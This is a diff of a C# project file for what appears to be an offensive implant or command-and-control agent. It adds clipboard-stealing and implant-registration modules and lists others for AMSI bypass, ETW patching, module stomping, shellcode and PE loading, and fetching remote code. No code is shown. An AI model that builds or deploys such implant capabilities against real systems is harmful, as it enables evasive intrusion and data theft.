@@ -61,7 +61,9 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Management" />
     <Reference Include="System.Numerics" />
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
     <Reference Include="Microsoft.CSharp" />
@@ -72,14 +74,15 @@
   <ItemGroup>
     <Compile Include="Implant.cs" />
     <Compile Include="Modules\AmsiHBP.cs" />
+    <Compile Include="Modules\ClipboardFetcher.cs" />
     <Compile Include="Modules\CodeFetch.cs" />
     <Compile Include="Modules\Commands.cs" />
     <Compile Include="Modules\CompileAndRunNET.cs" />
     <Compile Include="Modules\EtwPatch.cs" />
     <Compile Include="Modules\ExecuteAssembly.cs" />
     <Compile Include="Modules\ModuleStomper.cs" />
-    <Compile Include="Modules\HeapEncrypt.cs" />
     <Compile Include="Modules\PELoader.cs" />
+    <Compile Include="Modules\RegisterImplant.cs" />
     <Compile Include="Modules\SCLoader.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
   </ItemGroup>
